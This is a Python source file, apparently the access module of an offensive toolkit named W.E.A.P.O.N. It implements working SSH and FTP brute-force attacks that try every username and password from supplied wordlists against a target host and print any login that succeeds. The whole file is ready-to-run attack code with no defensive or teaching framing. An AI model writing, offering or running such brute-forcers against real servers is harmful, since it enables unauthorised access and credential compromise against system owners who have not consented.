import argparse
import os
import subprocess
import paramiko
from paramiko.ssh_exception import AuthenticationException, SSHException, NoValidConnectionsError

from ftplib import FTP
import getpass

# -----------------------------
# SSH Brute Forcer
# -----------------------------
def ssh_bruteforce(host, userlist, passlist):
    print(f"[*] Starting SSH brute force on {host}")
    
    try:
        # Handle host:port parsing
        if ':' in host:
            host_ip, port = host.split(':')
            port = int(port)
        else:
            host_ip = host
            port = 22  # Default SSH port

        with open(userlist) as uf:
            usernames = uf.read().splitlines()
        with open(passlist) as pf:
            passwords = pf.read().splitlines()
    except Exception as e:
        print(f"[!] Error loading files or parsing host: {e}")
        return

    for user in usernames:
        for password in passwords:
            try:
                print(f"[*] Trying {user}:{password}")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host_ip, port=port, username=user, password=password, timeout=0.1)
                print(f"[+] SSH Login found: {user}:{password}")
                ssh.close()
                return
            except Exception as e:
                print(f"[-] Failed login {user}:{password} -> {e}")
                continue

    print("[!] No valid SSH credentials found.")


# -----------------------------
# FTP Brute Forcer
# -----------------------------
def ftp_bruteforce(host, userlist, passlist):
    print(f"[*] Starting FTP brute force on {host}")
    
    try:
        # Handle host:port parsing
        if ':' in host:
            host_ip, port = host.split(':')
            port = int(port)
        else:
            host_ip = host
            port = 21  # Default FTP port

        with open(userlist) as uf:
            usernames = uf.read().splitlines()
        with open(passlist) as pf:
            passwords = pf.read().splitlines()
    except Exception as e:
        print(f"[!] Error loading files or parsing host: {e}")
        return

    for user in usernames:
        for password in passwords:
            try:
                print(f"[*] Trying {user}:{password}")  # DEBUG LINE
                ftp = FTP()
                ftp.connect(host_ip, port, timeout=0.1)
                ftp.login(user, password)
                print(f"[+] FTP Login found: {user}:{password}")
                ftp.quit()
                return
            except Exception as e:
                print(f"[-] Failed login {user}:{password} -> {e}")
                continue

    print("[!] No valid FTP credentials found.")



# -----------------------------
# Main CLI Logic
# -----------------------------
def main():
    parser = argparse.ArgumentParser(description="Access Module - W.E.A.P.O.N.")
    sub = parser.add_subparsers(dest="mode")

    ssh = sub.add_parser("ssh", help="SSH brute force")
    ssh.add_argument("host")
    ssh.add_argument("users")
    ssh.add_argument("passwords")

    ftp = sub.add_parser("ftp", help="FTP brute force")
    ftp.add_argument("host")
    ftp.add_argument("users")
    ftp.add_argument("passwords")


    args = parser.parse_args()

    if args.mode == "ssh":
        ssh_bruteforce(args.host, args.users, args.passwords)
    elif args.mode == "ftp":
        ftp_bruteforce(args.host, args.users, args.passwords)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
